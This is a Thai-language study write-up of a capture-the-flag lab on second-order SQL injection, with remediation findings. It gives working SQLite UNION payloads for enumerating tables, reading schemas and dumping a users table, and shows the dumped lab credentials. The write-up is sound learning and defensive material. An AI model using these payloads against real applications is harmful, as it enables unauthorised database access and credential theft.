# Day 4 — Second-Order SQL Injection (Vulnerable Notes)

---

## สิ่งที่เรียนวันนี้

Day 4 ต่างจาก Day 1–3 อย่างชัดเจน เพราะช่องโหว่ไม่ได้เกิดขึ้นทันทีตอนที่ใส่ payload เข้าไป แต่เป็นการฝัง payload ไว้ในระบบก่อน แล้วไป trigger ทีหลังใน function อื่น ซึ่งเรียกว่า **Second-Order SQL Injection**

โจทย์บอกว่า login form ถูกแก้ไขแล้ว ไม่มีช่องโหว่ SQL Injection อีกต่อไป ทีมพัฒนาได้เพิ่ม function ใหม่คือ Notes ให้ user สามารถเพิ่ม notes ได้ เป้าหมายคือหาช่องโหว่และ dump database เพื่อหา flag

หากใช้คำง่ายๆ คือ Day 1–3 เหมือนยื่นระเบิดที่จุดชนวนแล้วใส่เข้าไปในระบบ แต่ Day 4 คือใส่ระเบิดเข้ากล่องพัสดุ เก็บไว้ในคลัง แล้วระบบเป็นคนหยิบกล่องออกมาเปิดฝาและจุดชนวนให้โดยไม่รู้ตัว

---

## Second-Order SQL Injection คืออะไร

### First-Order vs Second-Order

- **First-Order** (Day 1–3) → ใส่ payload แล้ว execute ทันทีที่จุดเดียวกัน เช่น ใส่ `admin'-- -` ใน login form แล้ว bypass ได้เลย
- **Second-Order** (Day 4) → payload ถูกเก็บไว้ใน database ก่อนเป็น plain text แล้วไป execute ทีหลังเมื่อ function อื่นดึงข้อมูลนั้นออกมาใช้โดยไม่ได้ป้องกัน

### ทำไมเกิดช่องโหว่นี้ได้

ระบบมี 2 query ที่เกี่ยวข้อง:

**Query ที่ปลอดภัย (INSERT) — ใช้ parameterized query:**
```sql
INSERT INTO users (username, password) VALUES (?, ?)
```
→ ใช้ `?` placeholder ทำให้ database มองทุกอย่างที่ใส่เข้ามาเป็น **data** ไม่ใช่ **code** ดังนั้น payload จะถูกเก็บเป็น plain text ธรรมดา

**Query ที่มีช่องโหว่ (SELECT) — ใช้ string concatenation:**
```sql
SELECT title, note FROM notes WHERE username = '" + username + "'
```
→ เอา username มาต่อ string ตรงๆ ไม่ได้ใช้ parameterized query ทำให้ payload ที่เก็บไว้ถูก execute เป็น SQL command

### Flow การโจมตี

ทุก payload ที่ต้องการลอง ต้องทำครบ 3 ขั้นตอน:

1. **Register** user ใหม่ด้วย username เป็น payload (ถูกเก็บเป็น plain text)
2. **Login** ด้วย username ที่สร้าง (พิมพ์ payload ทั้งก้อนเป็นชื่อ user)
3. **เปิดหน้า Notes** → ระบบดึง username ออกมาต่อ string → payload ถูก execute → ดูผลลัพธ์

**ทุก payload = register user ใหม่ 1 คน** เพราะ username เปลี่ยนทีหลังไม่ได้ ต่างจาก Day 2 ที่แก้ nickname ได้เรื่อยๆ

---

## ขั้นตอนการ Exploit

### Step 1 — ระบุชนิดของ Database Engine

**Payload (username ตอน register):**
```sql
1' UNION SELECT 1, sqlite_version()'
```

**Query ที่ระบบ execute ตอนเปิดหน้า Notes:**
```sql
SELECT title, note FROM notes WHERE username = '1' UNION SELECT 1, sqlite_version()''
```

> `''` สองตัวติดกันใน SQL คือ escaped single quote ระบบมองเป็น string ว่างๆ ไม่กระทบผลลัพธ์ ไม่ต้องใช้ `-- -` ตัดทิ้ง

### Step 2 — Enumerate Tables

**Payload:**
```sql
1' UNION SELECT 1, (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%')'
```

**ผลลัพธ์:** `users,notes` → database มี 2 tables

### Step 3 — ตรวจสอบโครงสร้างของ Table

> ⚠️ ไม่เปิดเผยชื่อ Table จริงที่เกี่ยวข้องกับโจทย์ — ใช้ T1, T2 แทน

**Payload:**
```sql
1' UNION SELECT 1, (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='T1')'
```

**ผลลัพธ์:** `CREATE TABLE users ( id integer primary key, username text unique not null, password text not null )`

→ Table `users` มี 3 columns: **id**, **username**, **password**

### Step 4 — Dump ข้อมูลภายใน Table

**Payload:**
```sql
1' UNION SELECT 1, (SELECT group_concat(id || "," || username || "," || password || ":") FROM T1)'
```

**ผลลัพธ์:**
```
1,admin,rcLYWHCxeGUsA9tH3GNV:
2,dev,asd:
3,amanda,Summer2019!:
4,maja,345m3io4hj3:
5,xxxFLAGxxx,THM{...}:
6,emil,viking123:
```

---

## จุดที่เข้าใจผิดและต้องแก้ไข

### Parameterized query ป้องกัน SQLi ได้ทุกจุด — เข้าใจผิดในตอนแรก

**เข้าใจผิด:** คิดว่าถ้า INSERT ใช้ parameterized query แล้ว ระบบปลอดภัย

**ที่ถูกต้อง:** Parameterized query ป้องกันได้เฉพาะ query ที่ใช้มันเท่านั้น ถ้า query อื่นใน function อื่น (เช่น SELECT ที่ดึง notes) ไม่ได้ใช้ parameterized query ก็ยังมีช่องโหว่ ต้องทำ **ทุก query** ที่เกี่ยวข้องกับข้อมูลจาก user

### Payload ต้องปิด string ให้ถูกต้อง — ลืม `'` ปิดท้าย

**เข้าใจผิด:** เขียน payload โดยไม่ใส่ `'` ปิดท้าย ทำให้ SQL syntax ผิดและไม่แสดงผล

**ที่ถูกต้อง:** ต้องดู query เดิมว่ามี `'` ปิดท้ายอยู่แล้วหรือไม่ แล้วออกแบบ payload ให้ string สมบูรณ์ ใช้ `'` ปิดท้ายให้กลายเป็น `''` (escaped quote) หรือใช้ `-- -` ตัดส่วนที่เหลือทิ้ง ทั้ง 2 วิธีใช้ได้

### Login ด้วย payload — สับสนว่าต้องพิมพ์อะไร

**เข้าใจผิด:** คิดว่าตอน login ใส่แค่ส่วนแรกของ payload (เช่น `1`) เป็น username

**ที่ถูกต้อง:** Parameterized query เก็บ payload ทั้งก้อนเป็นชื่อ user ดังนั้นตอน login ต้องพิมพ์ payload ทั้งหมดเป็น username เช่น `1' UNION SELECT 1, sqlite_version()'`

---

## Finding ที่ควรแจ้งลูกค้า

### Finding 1: Second-Order SQL Injection ที่หน้า Notes
- **Severity:** Critical
- **Root cause:** Query ดึง notes ใช้ string concatenation ไม่ใช้ parameterized query
- **Impact:** Attacker สามารถ dump ข้อมูลทั้งหมดใน database ได้ รวมถึง username และ password ของทุก user
- **Remediation:** เปลี่ยนเป็น `WHERE username = ?` เหมือน INSERT ที่ทำไว้แล้ว

### Finding 2: Plain text password storage
- **Severity:** Critical
- **Root cause:** ระบบเก็บ password เป็น plain text ไม่ได้ hash
- **Impact:** หาก database ถูก dump (เช่นจาก Finding 1) attacker ได้ password ทุกคนไปใช้ได้ทันที
- **Remediation:** เปลี่ยนเป็น hash + salt ทุก password

### Finding 3: Parameterized query ไม่ครบทุก query
- **Severity:** High
- **Root cause:** INSERT ใช้ parameterized query แล้ว แต่ SELECT ไม่ได้ใช้
- **Impact:** แม้จุดรับข้อมูลจะปลอดภัย แต่จุดที่ดึงข้อมูลออกมาใช้ยังมีช่องโหว่
- **Remediation:** ทุก query ที่มี user input หรือข้อมูลจาก database ต้องใช้ parameterized query ไม่ใช่แค่บางจุด

---

## Lesson สำคัญที่สุดของวันนี้

- **Second-Order SQLi คือท่าขั้นสูง** — payload ไม่ได้ execute ทันที แต่ถูกเก็บไว้ใน database ก่อนแล้วไป trigger ทีหลังใน function อื่น ทำให้ตรวจจับยากกว่า First-Order เพราะจุดที่รับ input กับจุดที่มีช่องโหว่อยู่คนละที่

- **Parameterized query ต้องทำทุกจุด ไม่ใช่แค่บางจุด** — นี่คือ lesson สำคัญที่สุดของวันนี้ การทำ parameterized query แค่ INSERT ไม่พอ ถ้า SELECT ยังใช้ string concatenation ก็ยังโดนเจาะ ทุก query ที่เกี่ยวข้องกับข้อมูลจาก user ต้องใช้ parameterized query

- **Manual ก่อน Automated** — ในงานจริงควรทำ manual ก่อนเพื่อเข้าใจโครงสร้างระบบ แล้วค่อยใช้ tool อย่าง sqlmap ทำ automated ทีหลัง เพราะ sqlmap เป็น tool ที่ noisy มาก ส่ง request จำนวนมากและสร้าง user หลายร้อยตัว อาจทำให้ระบบลูกค้ามีปัญหาได้

- **ผลลัพธ์ dump ยืนยัน concept ที่เรียน** — user 7–10 ที่เห็นในผลลัพธ์คือ payload ที่เราสร้างระหว่าง enumerate ยืนยันว่า parameterized query เก็บ payload เป็น plain text จริงๆ

---

## เปรียบเทียบ SQLi ที่เรียนมาทั้ง 4 วัน

| **Day** | **ประเภท** | **จุดที่ฉีด** | **ผล execute** | **ลักษณะ** |
|---------|-----------|-------------|---------------|-----------|
| Day 1 | First-Order (In-band) | Login form | ทันที | ผลแสดงโดยตรง |
| Day 2 | First-Order (In-band) | UPDATE profile | ทันที | แก้ไขข้อมูลใน DB |
| Day 3 | First-Order (In-band + Blind) | Login form | ทันที | Classic + Boolean-based Blind |
| Day 4 | **Second-Order** | Register → Notes | **ทีหลัง** | Payload เก็บก่อน trigger ทีหลัง |

---

## คำถามที่ยังไม่ชัด / Open Question

โจทย์ได้แนะนำเรื่อง **sqlmap tamper script** สำหรับ automate Second-Order SQLi ซึ่งต้องเขียน Python script ที่ทำ 3 ขั้นตอน (register → login → trigger) อัตโนมัติ หากมีโอกาสอยากศึกษา tamper script เพิ่มเติม เพราะเป็น skill ที่ต่อยอดจาก Python script ที่เขียนใน Day 3 และช่วยให้เข้าใจการทำงานของ sqlmap ลึกขึ้น

---

*Day 4 Complete — ต่อไป: Day 5*
